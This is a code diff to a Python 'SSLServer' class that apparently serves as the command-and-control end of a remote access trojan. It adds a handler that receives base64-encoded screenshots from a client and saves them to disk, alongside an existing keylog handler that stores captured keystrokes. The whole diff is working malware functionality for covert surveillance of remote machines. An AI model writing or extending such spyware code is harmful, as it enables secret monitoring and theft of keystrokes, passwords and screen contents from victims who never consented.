@@ -155,6 +155,35 @@ class SSLServer:
 
             print("Keylogger save error:", e)
 
+    def _save_screenshot(self, response):
+
+        import base64
+        from datetime import datetime
+
+        try:
+
+            lines = response.split("\n")
+
+            if lines[1] != "OK":
+                print(response)
+                return
+
+            encoded = "".join(lines[2:])
+
+            image_bytes = base64.b64decode(encoded)
+
+            filename = f"screenshot_" f"{datetime.now().timestamp()}.png"
+
+            with open(filename, "wb") as f:
+
+                f.write(image_bytes)
+
+            print(f"Screenshot saved: {filename}")
+
+        except Exception as e:
+
+            print("Screenshot save error:", e)
+
     def _recv_until_eof(self, sock):
 
         buffer = ""
@@ -208,6 +237,10 @@ class SSLServer:
                 elif response_type == "KEYLOG":
 
                     self._save_keylog(response)
+
+                elif response_type == "SCREENSHOT":
+
+                    self._save_screenshot(response)
 
                 else:
 
